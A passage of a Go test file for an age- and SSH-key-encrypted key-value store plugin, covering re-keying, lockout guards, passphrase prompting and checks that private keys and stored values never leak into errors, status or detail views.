func TestSSHKeyEncryptionRoundTrip(t *testing.T) {
	setup(t)
	keys := t.TempDir()
	private, _ := writeSSHKeypair(t, keys, "id_ed25519")

	// Start passphrase-encrypted, then switch the lock over to the key.
	text(t, runSet, map[string]any{"key": "first", "value": "before-migration"}, false)
	text(t, runRekey, map[string]any{
		"only": true, "recipient": []string{private + ".pub"}, "identity": private,
	}, false)
	text(t, runSet, map[string]any{
		"key": "token", "value": "key-encrypted-secret", "identity": private,
	}, false)

	// The passphrase no longer opens it; the key does.
	_, err := runGet(context.Background(), req(map[string]any{"key": "token"}, false))
	if ve := view.AsError(err, "z"); ve.Code != "kv.identity.required" || ve.Hint == "" {
		t.Errorf("passphrase should no longer work: %+v", ve)
	}
	v, err := runGet(context.Background(), req(map[string]any{"key": "token", "identity": private}, false))
	if err != nil {
		t.Fatal(err)
	}
	if v.(view.Text).Body != "key-encrypted-secret" {
		t.Errorf("value via ssh key = %v", v)
	}
	// Re-keying must carry the existing entries across, not start fresh.
	v, err = runGet(context.Background(), req(map[string]any{"key": "first", "identity": private}, false))
	if err != nil {
		t.Fatal(err)
	}
	if v.(view.Text).Body != "before-migration" {
		t.Errorf("pre-migration entry = %v", v)
	}
}

// A regression test for a real bug review caught:
// parseIdentities used to read only the first AGE-SECRET-KEY- line of an
// identity file, silently ignoring every key after it — even though age's
// own convention (age-keygen >> identities.txt) is to accumulate several
// keys in one file. A store actually protected by the second key reported
// kv.wrongkey/a lockout refusal with the correct key sitting right there.
func TestMultiKeyIdentityFileUsesEveryKeyNotJustTheFirst(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "first", "value": "before-migration"}, false)

	decoy, err := age.GenerateX25519Identity()
	if err != nil {
		t.Fatal(err)
	}
	real, err := age.GenerateX25519Identity()
	if err != nil {
		t.Fatal(err)
	}
	multi := filepath.Join(t.TempDir(), "identities.txt")
	body := decoy.String() + "\n" + real.String() + "\n"
	if err := os.WriteFile(multi, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}

	// Lock the store to the second key in the file. Before the fix,
	// heldHere (via parseIdentities) only ever saw the decoy's public half,
	// so this would be refused as a lockout even though the real key is
	// right there in the same file.
	text(t, runRekey, map[string]any{
		"only": true, "recipient": []string{real.Recipient().String()}, "identity": multi,
	}, false)

	// Before the fix, readKeys only tried the decoy identity and reported
	// kv.wrongkey with the real key present in the same file.
	v, err := runGet(context.Background(), req(map[string]any{"key": "first", "identity": multi}, false))
	if err != nil {
		t.Fatalf("could not read with the second key in a multi-key identity file: %v", err)
	}
	if v.(view.Text).Body != "before-migration" {
		t.Errorf("got %v", v)
	}
}

// A regression test for a real bug review caught:
// parseRecipient's fallback error echoed up to 32 characters of whatever
// the caller supplied, including a mistakenly pasted private key — an
// AGE-SECRET-KEY-1... string is unambiguously secret material, and none of
// it belongs in an error message that reaches the terminal, shell history,
// or a log capturing command output.
func TestParseRecipientNeverEchoesAPastedPrivateKey(t *testing.T) {
	id, err := age.GenerateX25519Identity()
	if err != nil {
		t.Fatal(err)
	}
	_, _, perr := parseRecipient(id.String())
	if perr == nil {
		t.Fatal("expected an error: a private key is not a valid recipient")
	}
	if strings.Contains(perr.Error(), "AGE-SECRET-KEY-") {
		t.Errorf("private key material leaked into the error: %v", perr)
	}

	// The same guard applies to a stored kv.recipients entry, which has its
	// own independent echo point in recipientsFor's wrapping error.
	_, verr := recipientsFor([]string{id.String()})
	if verr == nil {
		t.Fatal("expected an error")
	}
	if strings.Contains(verr.Error(), "AGE-SECRET-KEY-") {
		t.Errorf("private key material leaked into the error: %v", verr)
	}

	// A genuinely garbage (non-secret) recipient is still shown, truncated,
	// so a real typo stays debuggable.
	_, _, perr = parseRecipient("not-a-key-at-all")
	if perr == nil || !strings.Contains(perr.Error(), "not-a-key-at-all") {
		t.Errorf("ordinary garbage should still be echoed for debugging: %v", perr)
	}
}

// A gap named rather than fixed alongside the rest of that review:
// publicHalf's other branch — a --recipient path whose own content is a raw
// age identity, not one kv generated itself — derives the recipient
// directly from the identity's public half (age.ParseX25519Identity) rather
// than falling through to the .pub-sibling lookup, exactly as kv.rekey's
// own --recipient help text documents ("a path to one — including a private
// key, whose public half is all that is read"). Deliberately no .pub file
// beside it: that is what proves this branch ran rather than the sibling
// lookup one line below it in publicHalf.
func TestParseRecipientDerivesTheRecipientFromAPathToARawAgeIdentity(t *testing.T) {
	id, err := age.GenerateX25519Identity()
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "identity")
	if err := os.WriteFile(path, []byte(id.String()+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	r, spec, perr := parseRecipient(path)
	if perr != nil {
		t.Fatalf("parseRecipient(%q): %v", path, perr)
	}
	want := id.Recipient().String()
	if spec != want {
		t.Errorf("spec = %q, want the derived recipient %q", spec, want)
	}
	if r.(interface{ String() string }).String() != want {
		t.Errorf("recipient = %v, want %q", r, want)
	}
}

// Handing the store to someone else must never hand it away from yourself.
func TestRekeyRefusesToLockYouOut(t *testing.T) {
	setup(t)
	_, public := writeSSHKeypair(t, t.TempDir(), "colleague")
	text(t, runSet, map[string]any{"key": "k", "value": "v"}, false)

	_, err := runRekey(context.Background(), req(map[string]any{
		"only": true, "recipient": []string{public},
	}, false))
	ve := view.AsError(err, "z")
	if ve.Code != "kv.rekey.lockout" || ve.Hint == "" {
		t.Errorf("want kv.rekey.lockout with hint, got %+v", ve)
	}
	// …and the store is untouched: still openable with the passphrase.
	if _, err := runList(context.Background(), req(nil, false)); err != nil {
		t.Errorf("refusing the re-key changed something: %v", err)
	}
}

func TestWrongIdentityIsCoded(t *testing.T) {
	setup(t)
	keys := t.TempDir()
	mine, _ := writeSSHKeypair(t, keys, "mine")
	theirs, _ := writeSSHKeypair(t, keys, "theirs")

	text(t, runSet, map[string]any{"key": "k", "value": "v", "identity": mine}, false)

	_, err := runGet(context.Background(), req(map[string]any{"key": "k", "identity": theirs}, false))
	ve := view.AsError(err, "z")
	if ve.Code != "kv.wrongkey" || ve.Hint == "" {
		t.Errorf("want kv.wrongkey with hint, got %+v", ve)
	}
}

// The migration command `kv recipients` prints for a passphrase store has to
// actually work: --recipient reads either a public or a private key file,
// but only the private one also proves the caller holds it — the guard
// naming a .pub alone would refuse, unable to tell it apart from handing the
// store to a stranger.
func TestSuggestedMigrationCommandActuallyWorks(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "token", "value": "s3cret"}, false)
	private, _ := writeSSHKeypair(t, t.TempDir(), "id_ed25519")

	body := text(t, runRecipients, nil, false)
	if !strings.Contains(body, "--recipient") {
		t.Fatalf("no migration hint: %q", body)
	}

	if _, err := runRekey(context.Background(), req(map[string]any{
		"only": true, "recipient": []string{private},
	}, false)); err != nil {
		t.Fatalf("the suggested command was refused: %v", err)
	}
	v, err := runGet(context.Background(), req(map[string]any{"key": "token", "identity": private}, false))
	if err != nil || v.(view.Text).Body != "s3cret" {
		t.Errorf("the key it switched to does not open the store: %v %v", v, err)
	}
}

func TestRecipientsListsWhoCanRead(t *testing.T) {
	setup(t)
	v, err := runRecipients(context.Background(), req(nil, false))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(v.(view.Text).Body, "passphrase") {
		t.Errorf("no recipients yet = %v", v)
	}

	keys := t.TempDir()
	private, _ := writeSSHKeypair(t, keys, "id_ed25519")
	text(t, runSet, map[string]any{"key": "k", "value": "v", "identity": private}, false)

	tbl := table(t, runRecipients, nil)
	if len(tbl.Rows) != 1 {
		t.Fatalf("recipients = %v", tbl.Rows)
	}
	if tbl.Rows[0][0] != "ssh-ed25519" || tbl.Rows[0][2] != "id_ed25519@test" {
		t.Errorf("recipient row = %v", tbl.Rows[0])
	}
}

func TestBadRecipientIsCoded(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "k", "value": "v"}, false)
	_, err := runRekey(context.Background(), req(map[string]any{
		"recipient": []string{"definitely not a key"},
	}, false))
	ve := view.AsError(err, "z")
	if ve.Code != "kv.recipient.invalid" || ve.Hint == "" {
		t.Errorf("want kv.recipient.invalid with hint, got %+v", ve)
	}
}

func TestUnreadableIdentityIsCoded(t *testing.T) {
	setup(t)
	private, _ := writeSSHKeypair(t, t.TempDir(), "id_ed25519")
	text(t, runSet, map[string]any{"key": "k", "value": "v", "identity": private}, false)

	_, err := runList(context.Background(), req(map[string]any{"identity": "/no/such/key"}, false))
	ve := view.AsError(err, "z")
	if ve.Code != "kv.identity.unreadable" || ve.Hint == "" {
		t.Errorf("want kv.identity.unreadable with hint, got %+v", ve)
	}
}

// A key named twice — once as a file, once derived from --identity — is one
// recipient, not two.
func TestRecipientDeduplicatesTheSameKey(t *testing.T) {
	setup(t)
	private, public := writeSSHKeypair(t, t.TempDir(), "id_ed25519")
	text(t, runInit, map[string]any{"identity": private, "recipient": []string{public}}, false)
	// …and naming it again as a recipient must not record it twice.
	text(t, runRekey, map[string]any{"identity": private, "recipient": []string{public}}, false)

	tbl := table(t, runRecipients, nil)
	if len(tbl.Rows) != 1 {
		t.Errorf("recipients = %v, want one entry for one key", tbl.Rows)
	}
}

// The store's own credentials must never be advertised to an agent: an MCP
// server is unlocked by its operator's environment, not by asking the model.
func TestUnlockFieldsAreLocal(t *testing.T) {
	for _, c := range Plugin().Capabilities {
		for _, f := range c.Inputs {
			switch f.Name {
			case "passphrase", "identity":
				if !f.Local {
					t.Errorf("%s: %q must be Local — it unlocks the store", c.ID, f.Name)
				}
			case "value":
				// The payload is not a credential to the store: an agent
				// storing a token it just minted is a legitimate call.
				if f.Local {
					t.Errorf("%s: %q is the payload, not a credential", c.ID, f.Name)
				}
			}
		}
	}
}

func TestIdentityFromEnv(t *testing.T) {
	setup(t)
	private, public := writeSSHKeypair(t, t.TempDir(), "id_ed25519")
	text(t, runSet, map[string]any{
		"key": "k", "value": "v", "identity": private, "recipient": []string{public},
	}, false)

	// No --identity anywhere: the environment is how a server is given one.
	t.Setenv(identityEnv, private)
	v, err := runGet(context.Background(), plugin.NewRequest(map[string]any{"key": "k"}, false, false))
	if err != nil {
		t.Fatal(err)
	}
	if v.(view.Text).Body != "v" {
		t.Errorf("get via %s = %v", identityEnv, v)
	}
}

// kv.status is the one capability that must work whatever state the store is
// in — it is what the dashboard shows, five seconds at a time, on a machine
// whose passphrase nobody has typed.
func TestStatusWithNoStore(t *testing.T) {
	setup(t)
	v, err := runStatus(context.Background(), plugin.NewRequest(nil, false, false))
	if err != nil {
		t.Fatalf("status on a fresh machine must not error: %v", err)
	}
	kv, ok := v.(view.KeyValue)
	if !ok {
		t.Fatalf("status = %s", view.TypeOf(v))
	}
	if got := pairValue(kv, "state"); !strings.Contains(got, "no store yet") {
		t.Errorf("state = %q", got)
	}
}

func TestStatusReportsHowTheStoreIsLocked(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "token", "value": "s3cr3t"}, false)

	v, err := runStatus(context.Background(), req(nil, false))
	if err != nil {
		t.Fatal(err)
	}
	kv := v.(view.KeyValue)
	if got := pairValue(kv, "locked with"); got != "a passphrase" {
		t.Errorf("locked with = %q", got)
	}
	if got := pairValue(kv, "size"); got == "" {
		t.Error("status should say how big the store is")
	}
	// Status reads metadata, never contents: no part of a secret may appear.
	for _, p := range kv.Pairs {
		if strings.Contains(p.Value, "s3cr3t") {
			t.Fatalf("status leaked a stored value: %+v", p)
		}
	}
}

// pairValue reads one key out of a KeyValue view.
func pairValue(kv view.KeyValue, key string) string {
	for _, p := range kv.Pairs {
		if p.Key == key {
			return p.Value
		}
	}
	return ""
}

// The detail page for a key must never become a way to read it.
func TestShowNeverRevealsTheValue(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{
		"key": "token", "value": "s3cr3t", "description": "staging API",
	}, false)

	v, err := runShow(context.Background(), req(map[string]any{"key": "token"}, false))
	if err != nil {
		t.Fatal(err)
	}
	kv, ok := v.(view.KeyValue)
	if !ok {
		t.Fatalf("show = %s", view.TypeOf(v))
	}
	for _, p := range kv.Pairs {
		if strings.Contains(p.Value, "s3cr3t") {
			t.Fatalf("kv.show leaked the value: %+v", p)
		}
	}
	if pairValue(kv, "description") != "staging API" {
		t.Errorf("description = %q", pairValue(kv, "description"))
	}
	if pairValue(kv, "size") == "" {
		t.Error("size is what tells you a token is a token without telling you which one")
	}
}

func TestShowUnknownKeyIsCoded(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "token", "value": "v"}, false)
	if _, err := runShow(context.Background(), req(map[string]any{"key": "nope"}, false)); err == nil {
		t.Error("showing a key that does not exist was accepted")
	}
}

// --- Setting the lock once --------------------------------------------------

// setupWithConfig isolates both the store and the config dir, since the
// generated identity lives beside the config on purpose.
func setupWithConfig(t *testing.T) (dataDir, configDir string) {
	t.Helper()
	dataDir = setup(t)
	return dataDir, filepath.Dir(os.Getenv("RTA_CONFIG"))
}

// The whole point: set the lock once, then never mention it again.
func TestInitGeneratesAKeyAndNeedsNoFlagsAfterwards(t *testing.T) {
	_, configDir := setupWithConfig(t)

	body := text(t, runInit, map[string]any{"generate": true}, false)
	if !strings.Contains(body, "back it up") {
		t.Errorf("init should say the key is unrecoverable: %q", body)
	}
	keyPath := filepath.Join(configDir, "kv.identity")
	info, err := os.Stat(keyPath)
	if err != nil {
		t.Fatalf("no key generated: %v", err)
	}
	if info.Mode().Perm() != 0o600 {
		t.Errorf("key mode = %v, want 0600", info.Mode().Perm())
	}

	// No identity, no passphrase, no flags — and it works.
	bare := func(values map[string]any) plugin.Request {
		return plugin.NewRequest(values, false, false)
	}
	if _, err := runSet(context.Background(), bare(map[string]any{"key": "token", "value": "s3cr3t"})); err != nil {
		t.Fatalf("set after init: %v", err)
	}
	v, err := runGet(context.Background(), bare(map[string]any{"key": "token"}))
	if err != nil {
		t.Fatalf("get after init: %v", err)
	}
	if v.(view.Text).Body != "s3cr3t" {
		t.Errorf("value = %v", v)
	}
}

// The key must not live beside the ciphertext: a copy of the data directory
// should be an encrypted store and nothing else.
func TestGeneratedKeyIsNotStoredNextToTheStore(t *testing.T) {
	dataDir, configDir := setupWithConfig(t)
	text(t, runInit, map[string]any{"generate": true}, false)

	entries, err := os.ReadDir(dataDir)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		if strings.Contains(e.Name(), "identity") {
			t.Errorf("private key %q sits in the data dir", e.Name())
		}
	}
	if _, err := os.Stat(filepath.Join(configDir, "kv.identity")); err != nil {
		t.Errorf("key is not beside the config: %v", err)
	}
}

// Naming an identity and no recipient is how somebody says "lock this with my
// key". Answering with "no passphrase provided" asks for the very thing they
// were avoiding.
func TestIdentityAloneLocksTheStoreToThatKey(t *testing.T) {
	setupWithConfig(t)
	keys := t.TempDir()
	private, _ := writeSSHKeypair(t, keys, "id_ed25519")

	bare := func(values map[string]any) plugin.Request {
		return plugin.NewRequest(values, false, false)
	}
	if _, err := runSet(context.Background(), bare(map[string]any{
		"key": "token", "value": "s3cr3t", "identity": private,
	})); err != nil {
		t.Fatalf("set with an identity and no recipient: %v", err)
	}
	specs, verr := loadRecipients()
	if verr != nil || len(specs) != 1 {
		t.Fatalf("recipients = %v (%v)", specs, verr)
	}
	v, err := runGet(context.Background(), bare(map[string]any{"key": "token", "identity": private}))
	if err != nil {
		t.Fatal(err)
	}
	if v.(view.Text).Body != "s3cr3t" {
		t.Errorf("value = %v", v)
	}
}

// Re-initialising would write a recipients file describing a store none of
// those recipients can open.
func TestInitRefusesAnExistingStore(t *testing.T) {
	setupWithConfig(t)
	text(t, runSet, map[string]any{"key": "token", "value": "v"}, false)

	_, err := runInit(context.Background(), req(map[string]any{"generate": true}, false))
	if ve := view.AsError(err, "z"); ve.Code != "kv.init.exists" {
		t.Fatalf("err = %+v, want a refusal", ve)
	}
}

// A generated key must never be silently replaced: that would lock the store
// against itself.
func TestGenerateNeverClobbersAKey(t *testing.T) {
	_, configDir := setupWithConfig(t)
	path := filepath.Join(configDir, "kv.identity")
	if err := os.WriteFile(path, []byte("AGE-SECRET-KEY-EXISTING\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, verr := generateIdentity(path); verr == nil {
		t.Fatal("an existing key was overwritten")
	}
	data, _ := os.ReadFile(path)
	if !strings.Contains(string(data), "EXISTING") {
		t.Error("the existing key did not survive")
	}
}

func TestInitNeedsToBeToldSomething(t *testing.T) {
	setupWithConfig(t)
	_, err := runInit(context.Background(), plugin.NewRequest(nil, false, false))
	if ve := view.AsError(err, "z"); ve.Code != "kv.init.nokey" || ve.Hint == "" {
		t.Errorf("err = %+v", ve)
	}
}

// writeLockedSSHKey writes a passphrase-protected ed25519 key.
func writeLockedSSHKey(t *testing.T, dir, name, passphrase string) string {
	t.Helper()
	_, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	block, err := ssh.MarshalPrivateKeyWithPassphrase(priv, "", []byte(passphrase))
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, pem.EncodeToMemory(block), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

// stubKeyPrompt makes the key prompt reachable and counts how often it is
// used, answering differently on each attempt.
func stubKeyPrompt(t *testing.T, answers ...string) *int {
	t.Helper()
	asked := 0
	origPrompt, origCan := promptKeyPassphrase, canPrompt
	promptKeyPassphrase = func(string) (string, error) {
		answer := ""
		if asked < len(answers) {
			answer = answers[asked]
		}
		asked++
		return answer, nil
	}
	canPrompt = func(req plugin.Request) bool { return req.Surface() == plugin.SurfaceCLI }
	t.Cleanup(func() {
		promptKeyPassphrase, canPrompt = origPrompt, origCan
		keyPassphrases = map[string]string{}
	})
	keyPassphrases = map[string]string{}
	return &asked
}

func cliReq(values map[string]any) plugin.Request {
	return plugin.NewRequest(values, false, false).WithSurface(plugin.SurfaceCLI)
}

// ssh-agent cannot decrypt, so a locked key leaves exactly one way forward:
// ask the person who is standing there, the way ssh itself does.
func TestLockedKeyAsksForItsPassphrase(t *testing.T) {
	setupWithConfig(t)
	path := writeLockedSSHKey(t, t.TempDir(), "id_locked", "correct horse")
	asked := stubKeyPrompt(t, "correct horse")

	if _, err := runSet(context.Background(), cliReq(map[string]any{
		"key": "token", "value": "s3cr3t", "identity": path,
	})); err != nil {
		t.Fatalf("set with a locked key: %v", err)
	}
	v, err := runGet(context.Background(), cliReq(map[string]any{"key": "token", "identity": path}))
	if err != nil {
		t.Fatalf("get with a locked key: %v", err)
	}
	if v.(view.Text).Body != "s3cr3t" {
		t.Errorf("value = %v", v)
	}
	if *asked == 0 {
		t.Error("never asked for the passphrase")
	}
}

// Being asked twice for the same key in one command reads as a failure.
func TestKeyPassphraseIsAskedOnce(t *testing.T) {
	setupWithConfig(t)
	path := writeLockedSSHKey(t, t.TempDir(), "id_locked", "hunter2")
	asked := stubKeyPrompt(t, "hunter2", "hunter2", "hunter2")

	// set both reads the store and writes it back: two unlocks, one question.
	if _, err := runSet(context.Background(), cliReq(map[string]any{
		"key": "token", "value": "v", "identity": path,
	})); err != nil {
		t.Fatal(err)
	}
	if _, err := runSet(context.Background(), cliReq(map[string]any{
		"key": "other", "value": "v", "identity": path,
	})); err != nil {
		t.Fatal(err)
	}
	if *asked != 1 {
		t.Errorf("asked %d times, want 1", *asked)
	}
}

// A typo gets another go, not a wall.
func TestMistypedKeyPassphraseIsAskedAgain(t *testing.T) {
	setupWithConfig(t)
	path := writeLockedSSHKey(t, t.TempDir(), "id_locked", "right")
	asked := stubKeyPrompt(t, "wrong", "right")

	if _, err := runSet(context.Background(), cliReq(map[string]any{
		"key": "token", "value": "v", "identity": path,
	})); err != nil {
		t.Fatalf("second attempt should have worked: %v", err)
	}
	if *asked != 2 {
		t.Errorf("asked %d times, want 2", *asked)
	}
}

// There is one --passphrase and two things it could unlock. A store passphrase
// that does not fit the key is not a dead end: the prompt names the file, so
// which secret is wanted is never in doubt.
func TestKeyPassphraseIsAskedForEvenWhenAStorePassphraseWasGiven(t *testing.T) {
	setupWithConfig(t)
	path := writeLockedSSHKey(t, t.TempDir(), "id_locked", "the key one")
	asked := stubKeyPrompt(t, "the key one")

	if _, verr := parseIdentities(cliReq(map[string]any{"passphrase": "the store one"}), path); verr != nil {
		t.Fatalf("verr = %+v", verr)
	}
	if *asked != 1 {
		t.Errorf("asked %d times, want 1", *asked)
	}
}

// With nobody there to ask, a supplied passphrase that does not fit says so —
// "passphrase-protected" would send somebody looking for the one they gave.
func TestWrongKeyPassphraseIsNamedWhenNobodyCanBeAsked(t *testing.T) {
	setupWithConfig(t)
	path := writeLockedSSHKey(t, t.TempDir(), "id_locked", "right")
	asked := stubKeyPrompt(t, "right")

	req := plugin.NewRequest(map[string]any{"passphrase": "wrong"}, false, false).
		WithSurface(plugin.SurfaceMCP)
	_, verr := parseIdentities(req, path)
	if verr == nil || verr.Code != "kv.identity.locked" {
		t.Fatalf("verr = %+v", verr)
	}
	if !strings.Contains(verr.Error(), "wrong passphrase") {
		t.Errorf("message = %q", verr.Error())
	}
	if *asked != 0 {
		t.Error("an MCP request reached a terminal prompt")
	}
}

// A prompt fired by the tab key would hang a shell mid-command-line on a
// question nobody expects.
func TestCompletionNeverAsksForAKeyPassphrase(t *testing.T) {
	setupWithConfig(t)
	path := writeLockedSSHKey(t, t.TempDir(), "id_locked", "secret")
	asked := stubKeyPrompt(t, "secret")

	req := plugin.NewRequest(map[string]any{"identity": path}, false, false).
		WithSurface(plugin.SurfaceCompletion)
	if _, verr := parseIdentities(req, path); verr == nil {
		t.Error("completion unlocked a key")
	}
	if *asked != 0 {
		t.Errorf("completion asked %d questions", *asked)
	}
}

// An agent inheriting a locked key inherits nothing it can use, and saying
// "no key material here" would be the wrong answer to a different question.
func TestLockedIdentityIsReportedSeparately(t *testing.T) {
	_, configDir := setupWithConfig(t)
	path := writeLockedSSHKey(t, configDir, "kv.identity", "secret")
	stubKeyPrompt(t, "secret")

	if _, err := runSet(context.Background(), cliReq(map[string]any{"key": "k", "value": "v"})); err != nil {
		t.Fatalf("set with the default identity: %v", err)
	}
	if ok, _ := Unlockable(); ok {
		t.Error("a locked key counted as usable key material")
	}
	if got := LockedIdentity(); got != path {
		t.Errorf("LockedIdentity() = %q, want %q", got, path)
	}
	t.Setenv(passphraseEnv, "secret")
	if ok, _ := Unlockable(); !ok {
		t.Error("a locked key with its passphrase in the environment is usable")
	}
	if LockedIdentity() != "" {
		t.Error("still reported as locked with the passphrase available")
	}
}

// A regression test for a real bug review caught:
// Unlockable() trusted RTA_KV_IDENTITY without checking the path it names
// actually exists — unlike LockedIdentity(), its sibling two functions
// above, which already guarded this. `rta doctor` uses Unlockable() to tell
// an operator whether an MCP agent's inherited environment can decrypt the
// store unattended; a stale or typo'd env var used to report "yes" even
// though a real kv.get against the same environment would fail outright
// with kv.identity.unreadable.
func TestUnlockableDoesNotTrustAStaleIdentityEnvVar(t *testing.T) {
	_, configDir := setupWithConfig(t)
	path, _ := writeSSHKeypair(t, configDir, "id_ed25519")

	if _, err := runSet(context.Background(), cliReq(map[string]any{
		"key": "k", "value": "v", "identity": path,
	})); err != nil {
		t.Fatalf("set with an explicit identity: %v", err)
	}

	t.Setenv(identityEnv, filepath.Join(t.TempDir(), "does-not-exist"))
	if ok, source := Unlockable(); ok {
		t.Errorf("a nonexistent RTA_KV_IDENTITY counted as usable key material (source=%q)", source)
	}
}

// --- Re-keying -----------------------------------------------------------

// A regression test for a real bug review caught: saveTo
// writes the re-encrypted store and the plaintext kv.recipients file as two
// separate, non-atomic steps. If the second fails after the first
// succeeds, the store really is re-encrypted to the new key set, but the
// plaintext record of who can read it goes stale — and the error the
// operator sees has to say so explicitly, since `rta kv recipients` itself
// has no way to detect the mismatch on its own (it reads the plaintext
// file, not the ciphertext's embedded record).
func TestRekeyErrorNamesTheStaleRecipientsFileWhenOnlyThatWriteFails(t *testing.T) {
	dataDir := setup(t)

	id, err := age.GenerateX25519Identity()
	if err != nil {
		t.Fatal(err)
	}
	spec := id.Recipient().String()

	// saveTo never reads kv.recipients, only writes it — so preempting it as
	// a directory up front (rather than mid-call, which nothing here can do
	// to a single real filesystem) reproduces exactly the failure this test
	// is about: writeAtomic (kv.age, a different file) still succeeds, and
	// saveRecipients' own atomicfile.Write, whose final step renames onto
	// this exact path, cannot rename a file onto an existing directory.
	if err := os.Mkdir(filepath.Join(dataDir, "kv.recipients"), 0o755); err != nil {
		t.Fatal(err)
	}

	verr := saveTo(
		store{Entries: map[string]entry{"k": {Value: []byte("v")}}},
		[]age.Recipient{id.Recipient()},
		[]string{spec},
	)
	if verr == nil {
		t.Fatal("expected the recipients write to fail")
	}
	if !strings.Contains(verr.Hint, "WAS re-encrypted") {
		t.Errorf("hint = %q, want it to say the store was re-encrypted despite the failure", verr.Hint)
	}

	// Prove the ciphertext half really did commit, independent of the
	// failed plaintext write: decrypt kv.age directly with the identity
	// saveTo was told to encrypt it to.
	data, err := os.ReadFile(storePath())
	if err != nil {
		t.Fatal(err)
	}
	r, err := age.Decrypt(bytes.NewReader(data), id)
	if err != nil {
		t.Fatalf("the store was not actually encrypted to the given recipient: %v", err)
	}
	plaintext, err := io.ReadAll(r)
	if err != nil {
		t.Fatal(err)
	}
	var s store
	if err := json.Unmarshal(plaintext, &s); err != nil {
		t.Fatal(err)
	}
	if string(s.Entries["k"].Value) != "v" {
		t.Errorf("decrypted entries = %+v", s.Entries)
	}
}

// "I want both": the store keeps opening with the SSH key it was locked to,
// and gains one that needs no passphrase and no flag.
func TestRekeyGenerateAddsAKeyWithoutDroppingTheOldOne(t *testing.T) {
	_, configDir := setupWithConfig(t)
	private, _ := writeSSHKeypair(t, t.TempDir(), "id_ed25519")
	text(t, runInit, map[string]any{"identity": private}, false)
	text(t, runSet, map[string]any{"key": "token", "value": "s3cr3t", "identity": private}, false)

	text(t, runRekey, map[string]any{"generate": true, "identity": private}, false)

	if specs, _ := loadRecipients(); len(specs) != 2 {
		t.Fatalf("recipients = %v, want both keys", specs)
	}
	// The SSH key still opens it…
	v, err := runGet(context.Background(), req(map[string]any{"key": "token", "identity": private}, false))
	if err != nil || v.(view.Text).Body != "s3cr3t" {
		t.Errorf("ssh key stopped working: %v %v", v, err)
	}
	// …and so does the generated one, which needs no flag at all.
	v, err = runGet(context.Background(), plugin.NewRequest(map[string]any{"key": "token"}, false, false))
	if err != nil || v.(view.Text).Body != "s3cr3t" {
		t.Errorf("generated key does not open it: %v %v", v, err)
	}
	if _, err := os.Stat(filepath.Join(configDir, "kv.identity")); err != nil {
		t.Errorf("no key generated: %v", err)
	}
}

// "I want to switch": --only makes the named set the whole set, so the key
// that used to open the store no longer does.
func TestRekeyOnlyGenerateSwitchesTheLock(t *testing.T) {
	setupWithConfig(t)
	private, _ := writeSSHKeypair(t, t.TempDir(), "id_ed25519")
	text(t, runInit, map[string]any{"identity": private}, false)
	text(t, runSet, map[string]any{"key": "token", "value": "s3cr3t", "identity": private}, false)

	body := text(t, runRekey, map[string]any{"generate": true, "only": true, "identity": private}, false)
	if !strings.Contains(body, "dropped") {
		t.Errorf("a dropped reader should be stated plainly: %q", body)
	}

	if specs, _ := loadRecipients(); len(specs) != 1 {
		t.Fatalf("recipients = %v, want only the new key", specs)
	}
	v, err := runGet(context.Background(), plugin.NewRequest(map[string]any{"key": "token"}, false, false))
	if err != nil || v.(view.Text).Body != "s3cr3t" {
		t.Fatalf("the new key does not open it: %v %v", v, err)
	}
	// The old key is out. (RTA_KV_IDENTITY is empty here, so naming it is the
	// only way it could still be tried.)
	_, err = runGet(context.Background(), req(map[string]any{"key": "token", "identity": private}, false))
	if ve := view.AsError(err, "z"); ve.Code != "kv.wrongkey" {
		t.Errorf("the dropped key still opens the store: %+v", ve)
	}
}

// Naming the key you have is the obvious thing to try, and it is proof you
// have it — which is the question the lockout guard is really asking.
func TestRekeyAcceptsThePrivateKeyYouHave(t *testing.T) {
	setupWithConfig(t)
	private, _ := writeSSHKeypair(t, t.TempDir(), "id_ed25519")
	text(t, runSet, map[string]any{"key": "token", "value": "s3cr3t"}, false)

	// No --identity: the private key names itself as the surviving reader.
	text(t, runRekey, map[string]any{"only": true, "recipient": []string{private}}, false)

	specs, _ := loadRecipients()
	if len(specs) != 1 || strings.HasPrefix(specs[0], "-----BEGIN") {
		t.Fatalf("recorded %v — only the public half may be recorded", specs)
	}
	v, err := runGet(context.Background(), req(map[string]any{"key": "token", "identity": private}, false))
	if err != nil || v.(view.Text).Body != "s3cr3t" {
		t.Errorf("the named key does not open it: %v %v", v, err)
	}
}

// Re-keying starts by proving you can read what you are about to re-encrypt.
func TestRekeyRefusesAStoreItCannotOpen(t *testing.T) {
	setupWithConfig(t)
	private, _ := writeSSHKeypair(t, t.TempDir(), "mine")
	theirs, _ := writeSSHKeypair(t, t.TempDir(), "theirs")
	text(t, runInit, map[string]any{"identity": private}, false)
	text(t, runSet, map[string]any{"key": "k", "value": "v", "identity": private}, false)

	_, err := runRekey(context.Background(), req(map[string]any{"generate": true, "identity": theirs}, false))
	if ve := view.AsError(err, "z"); ve.Code != "kv.wrongkey" {
		t.Fatalf("err = %+v, want a refusal to re-key what it cannot read", ve)
	}
	// And nothing was generated on the way to failing.
	if fileExists(defaultIdentity()) {
		t.Error("a key was generated for a re-key that could not happen")
	}
}

// --dry-run has to be worth trusting: it must not leave a key behind.
func TestRekeyDryRunGeneratesNothing(t *testing.T) {
	setupWithConfig(t)
	text(t, runSet, map[string]any{"key": "k", "value": "v"}, false)

	body := text(t, runRekey, map[string]any{"generate": true, "only": true}, true)
	if !strings.Contains(body, "would") {
		t.Errorf("preview = %q", body)
	}
	if fileExists(defaultIdentity()) {
		t.Error("--dry-run generated a key")
	}
	if specs, _ := loadRecipients(); len(specs) != 0 {
